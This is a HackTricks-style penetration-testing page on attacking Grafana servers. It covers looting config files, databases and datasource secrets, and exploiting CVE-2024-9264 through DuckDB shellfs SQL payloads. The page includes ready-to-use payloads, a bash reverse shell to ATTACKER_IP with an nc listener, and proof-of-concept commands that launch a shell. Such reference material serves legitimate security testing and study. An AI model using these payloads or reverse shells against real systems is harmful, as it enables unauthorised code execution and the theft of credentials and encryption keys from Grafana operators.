---
title: "Grafana"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/grafana.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Interesting stuff

- Main configuration for Debian/RPM installs is commonly **`/etc/grafana/grafana.ini`** and can contain values such as**`admin_user`** ,**`admin_password`** ,**`secret_key`** , OAuth settings, SMTP credentials, and renderer tokens.<sup>[\[9\]](#references)</sup>
- The default SQLite database path for those packages is **`/var/lib/grafana/grafana.db`** ; container and custom installations may override it.<sup>[\[9\]](#references)</sup>
- Provisioning files are very interesting after host access:<sup>[\[4\]](#references)</sup>  - **`/etc/grafana/provisioning/datasources/*.yaml`**
  - **`/etc/grafana/provisioning/plugins/*.yaml`**
  - Environment-variable expansion is supported in provisioning files, so leaked YAML often reveals both secrets and the env var names backing them.
- Installed plugins are commonly found under **`/var/lib/grafana/plugins`** , unless`paths.plugins` is changed.<sup>[\[9\]](#references)</sup>
- Inside the platform you could **invite people** ,**generate API keys / service account tokens** ,**list plugins** , or**install new plugins** depending on the role.
- The browser is also loot: Grafana exposes non-secret datasource config to the frontend. If you have a **Viewer** session (or**anonymous access** is enabled), inspect**`window.grafanaBootData`** from DevTools.<sup>[\[2\]](#references)</sup>

Useful SQLite checks:

```
.tables
.schema data_source
SELECT id,org_id,name,type,url,access,is_default,json_data FROM data_source;
SELECT id,org_id,uid,login,email,is_admin FROM user;
SELECT id,org_id,uid,name,slug FROM dashboard;
```
## Looting datasources and secrets

Grafana separates browser-readable configuration from encrypted secrets:[\[2\]](#references)

- **`jsonData`** is visible to users in the browser and is commonly enough to enumerate internal hosts, tenants, auth modes, header names, AWS regions, Elasticsearch indexes, Loki tenants, Prometheus URLs, and similar recon data.
- **`secureJsonData`** is encrypted server-side and no longer readable from the browser after the datasource is saved.

Post-exploitation workflow:

1. Dump **`grafana.ini`** and recover**`secret_key`** .
2. Loot **`grafana.db`** and provisioning files.
3. Enumerate datasources and plugin configuration to find reusable credentials and internal endpoints.
4. If migrating or replaying the database in another Grafana instance, keep the same **`secret_key`** or stored datasource passwords/tokens will not decrypt correctly.<sup>[\[3\]](#references)</sup>

Why **`secret_key`** matters in newer versions:[\[3\]](#references)

- Since Grafana v9, database secrets use envelope encryption.
- Grafana encrypts secrets with **data encryption keys (DEKs)** , and those DEKs are encrypted with a**key encryption key (KEK)** derived from**`secret_key`** .
- From an attacker perspective, **`grafana.db` + `secret_key`** is the pair worth stealing.

## Plugin attack surface

Treat plugins as part of the target, not a footnote:

- Enumerate them from the filesystem, from the UI, or from the API:

```
curl -s http://grafana.target/api/plugins | jq '.[].id'
```
- Older or third-party plugins regularly expand Grafana’s reach into internal networks because they proxy HTTP requests or interact with local files/databases.<sup>[\[5\]](#references)</sup>
- Recent examples include SSRF in the **Infinity** plugin (`< 3.4.1` ) and abuse paths where the**Image Renderer** plugin turns another bug into**full-read SSRF** .

## CVE-2024-9264 – SQL Expressions (DuckDB shellfs) post-auth RCE / LFI

Grafana’s experimental SQL Expressions feature can evaluate DuckDB queries that embed user-controlled text. Insufficient sanitization allows attackers to chain DuckDB statements and load the community extension shellfs, which exposes shell commands via pipe-backed virtual files.[\[1\]](#references)[\[6\]](#references)

### Impact

- Any authenticated user with VIEWER or higher can get code execution as the Grafana OS user (often grafana; sometimes root inside a container) or perform local file reads.<sup>[\[1\]](#references)</sup>
- Preconditions commonly met in real deployments:<sup>[\[1\]](#references)</sup>  - SQL Expressions enabled: `expressions.enabled = true`
  - `duckdb` binary present in PATH on the server
- SQL Expressions enabled:

### Quick Checks

- In the UI/API, browse Admin settings (Swagger: `/swagger-ui` , endpoint`/api/admin/settings` ) to confirm:
  - `expressions.enabled` is true
  - Optional: version, datasource types, and general hardening settings
- Shell on host: `which duckdb` must resolve for the exploit path below.

### Manual Query Pattern Using DuckDB and shellfs

- Abuse flow (2 queries):<sup>[\[7\]](#references)</sup>  1. Install and load the shellfs extension, run a command, redirect combined output to a temp file via pipe
  2. Read back the temp file using `read_blob`

Example SQL Expressions payloads that get passed to DuckDB:

```
-- 1) Prepare shellfs and run command
SELECT 1; INSTALL shellfs FROM community; LOAD shellfs;
SELECT * FROM read_csv('CMD >/tmp/grafana_cmd_output 2>&1 |');
-- 2) Read the output back
SELECT content FROM read_blob('/tmp/grafana_cmd_output');
```
Replace CMD with your desired command. For file-read (LFI) you can instead use DuckDB file functions to read local files.

### One-Line Reverse-Shell Example

```
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"
```
Embed that as CMD in the first query while you have a listener: `nc -lnvp 443`.

### Automated PoC

Usage example

```
# Confirm execution context and UID
python3 CVE-2024-9264.py -u <USER> -p <PASS> -c id http://grafana.target
# Launch a reverse shell
python3 CVE-2024-9264.py -u <USER> -p <PASS> \
  -c 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"' \
  http://grafana.target
```
If output shows `uid=0(root)`, the Grafana process is running as root. Do not assume that is the default for all containers.

## 2025 client-side traversal / open redirect chain

The 2025 Grafana client-side traversal and open-redirect chain is already documented in more generic client-side pages. Use those techniques against Grafana-specific paths such as plugin assets, dashboard script loaders, and token-rotation redirects:

## References
